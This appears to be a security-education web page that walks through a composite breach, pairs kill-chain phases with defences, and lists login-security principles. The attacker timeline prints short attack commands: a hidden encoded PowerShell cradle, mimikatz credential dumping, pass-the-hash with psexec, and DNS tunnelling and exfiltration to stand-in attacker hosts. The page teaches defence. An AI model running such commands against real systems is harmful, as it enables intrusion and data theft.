FILE 01 // THE NARRATIVE

      
Anatomy of a Breach

      
Every intrusion is a story with a timeline. This one is composite but faithful — assembled from real incident patterns. Scroll through the attacker's arc, then watch the defenders rewrite the ending.

    

    

      

        
T+00:00

        
RECONNAISSANCE

        
EVENT 01 / 10

        

        
The red half of this story usually ends here. The blue half is why it shouldn't.

      

      

        

          
T+00:00 // RED
The attacker maps the surface

          
A threat actor runs Shodan and finds an internet-facing RDP port. LinkedIn reveals the finance team's names and email format. DNS records expose forgotten subdomains.

          
shodan search "port:3389 org:target"
theHarvester -d target.com -b linkedin,dns

        

        

          
T+02:14 // RED
The payload is built

          
A phishing document is crafted with an embedded macro. A staged PowerShell download cradle is prepared — fileless, living-off-the-land, nothing malicious ever touches disk.

          
powershell -nop -w hidden -enc SQBFAFgAIA...

        

        

          
T+06:40 // RED
The spear-phish lands

          
"Invoice_Q3.xlsm" arrives at a finance inbox, referencing a real vendor name scraped during recon. The sender domain is one letter off. Nobody notices.

          
From: billing@target-vend0r.com  [spoofed]
Subject: Overdue invoice — action required

        

        

          
T+06:52 // RED
Enable content. Game over?

          
The macro executes. Legacy AV sees only signed, native binaries. The cradle pulls the next stage straight into memory. First foothold established on FIN-WS-07.

          
[EVT] winword.exe spawned powershell.exe  ⚠ unmonitored

        

        

          
T+09:30 // RED
Embedding in the estate

          
A scheduled task masquerading as a software updater gives the attacker a way back in. Registry run keys are set as insurance. The implant checks in over HTTPS.

          
schtasks /create /tn "ChromeHealthSync" /sc hourly

        

        

          
T+15:10 // RED
Climbing to Domain Admin

          
LSASS memory is dumped and cracked offline. Pass-the-hash carries the attacker across SMB to the domain controller. Tiered admin was never implemented.

          
mimikatz # sekurlsa::logonpasswords
psexec.py target-DC01 -hashes aad3:a87f...

        

        

          
T+31:00 // RED
Staging the crown jewels

          
Customer records and source code are compressed with stolen admin credentials. Command-and-control hides inside high-entropy DNS queries that look like ordinary traffic.

          
7z a -p archive.7z \\fileserver\finance$
nslookup aGVsbG8.tunnel.attacker-c2.net

        

        

          
T+38:22 // RED
2.3 GB leaves the building

          
Data exits over port 443 to a legitimate cloud storage service — indistinguishable from normal business traffic. The ransomware timer is set for Friday, 02:00.

          
POST https://cdn-storage.example /upload  [encrypted]

        

        

          
T+41:05 // BLUE
The SOC lights up

          
The SIEM correlates two "small" events: an anomalous LSASS access and a spike in DNS query entropy. Alone, each was noise. Together, they are a signature. An analyst picks up the alert.

          
SPL: index=endpoint event="lsass_access" | stats count by host  → 4σ spike

        

        

          
T+43:40 // BLUE
Isolate, revoke, choke

          
EDR network-isolates FIN-WS-07. The compromised DC is segmented. All Kerberos tickets invalidated, sessions revoked, egress to the C2 domain blocked at the proxy.

          
krbtgt reset ×2 | firewall deny c2.attacker.net | host quarantine

        

        

          
T+47:00 // BLUE
The ending gets rewritten

          
Credentials rotated, systems rebuilt from clean images, gaps patched with SLA timers attached. The attacker's TTPs are mapped to MITRE ATT&CK and shared to MISP so the next defender starts ahead.

          
ATT&CK: T1566.001, T1059.001, T1003.001 → pushed to MISP feed

FILE 02 // OFFENSE × DEFENSE

      
The Dual Path

      
Every phase of the kill chain has a mirror image. The attacker's move, the defender's counter — and how an ethical hacker runs the same attack legally, with a signed scope, to prove the defense works.

    

    
ATTACKER TTPDEFENDER CONTROL


    
Red // How attackers think
    
      
  • Passive OSINT: LinkedIn, job postings, GitHub leaks
  • Active scanning: nmap, Shodan, DNS brute-force
  • Google dorking for exposed panels & backups

      
PHASE 01
Reconnaissance
Mapping the attack surface before touching it.

      
Blue // How defenders respond
    
      
  • External exposure audits + continuous ASM monitoring
  • Honeypots & canary tokens to spot probing
  • Ethical pentest repeats the recon — with written authorization — and reports every gap


    
Red // How attackers think
    
      
  • Craft macro documents, packers & obfuscated loaders
  • Buy/rent exploit kits and initial-access brokers
  • Match payloads to discovered versions (CVE lookup)

      
PHASE 02
Weaponization
Pairing an exploit with a payload.

      
Blue // How defenders respond
    
      
  • Threat-intel feeds mapped to MITRE ATT&CK
  • Sandbox detonation of suspicious samples
  • Purple-team exercises replay known TTPs against live controls


    
Red // How attackers think
    
      
  • Spear-phish with harvested context
  • Malicious ads, poisoned downloads, USB drops
  • Supply-chain: compromise the update, not the target

      
PHASE 03
Delivery
Getting the payload to a victim.

      
Blue // How defenders respond
    
      
  • Email auth: SPF / DKIM / DMARC enforced
  • URL rewriting, attachment sandboxing, safe-links
  • Security awareness training with realistic phishing sims


    
Red // How attackers think
    
      
  • Macros, unpatched CVEs, deserialization bugs
  • Web attacks: SQLi, XSS → session theft
  • Fileless execution to dodge signature AV

      
PHASE 04
Exploitation
Turning a vector into code execution.

      
Blue // How defenders respond
    
      
  • Patch SLAs + attack-surface reduction rules
  • WAF, parameterized queries, input validation
  • EDR with behavioral detection, not just signatures


    
Red // How attackers think
    
      
  • Scheduled tasks, registry run keys, WMI events
  • Abuse valid accounts — the quietest backdoor
  • Implant check-ins over HTTPS / DNS to blend in

      
PHASE 05
Persistence
Surviving reboots and password resets.

      
Blue // How defenders respond
    
      
  • Endpoint hardening + application allowlisting
  • Baseline monitoring: Sysmon, osquery
  • Credential hygiene: rotation, vaulting, least privilege


    
Red // How attackers think
    
      
  • Dump LSASS → pass-the-hash with Mimikatz
  • RDP/PSExec hops toward the domain controller
  • Golden ticket attacks to own identity itself

      
PHASE 06
Lateral Movement
From one workstation to the keys of the kingdom.

      
Blue // How defenders respond
    
      
  • LSA protection, Credential Guard, tiered admin model
  • Network segmentation & privileged-access workstations
  • NTA anomaly detection on east-west traffic


    
Red // How attackers think
    
      
  • Stage archives, exfil over 443 / DNS tunneling
  • Ransomware deploy as leverage or distraction
  • Sell access; return later with new credentials

      
PHASE 07
Actions on Objectives
Theft, destruction, or extortion.

      
Blue // How defenders respond
    
      
  • Egress filtering + DLP on sensitive data classes
  • SIEM correlation, tested IR playbooks, backups offline
  • Post-incident: lessons learned → controls → shared intel

FILE 06 // SECURE GATEWAY

      
Authentication, Done Right

      
A login flow is a security control, not a form. This demo runs entirely in your browser and demonstrates the concepts real systems implement.

    

    

      
    
        
  • Never store plaintext. Watch the SHA-256 digest update live as you type. Production systems hash server-side with salted, slow algorithms — bcrypt / scrypt / Argon2id.
    • 
        
  • Rate-limit everything. This form locks out after 5 failed attempts for 10 seconds — the same principle behind account lockout policies and WAF throttling.
    • 
        
  • Uniform error messages. "Invalid credentials" — never reveal whether the email exists. User enumeration is a real attack class.
    • 
        
  • Defense in depth. Real deployments add MFA, device posture checks, session binding, and anomaly detection on top.
    •
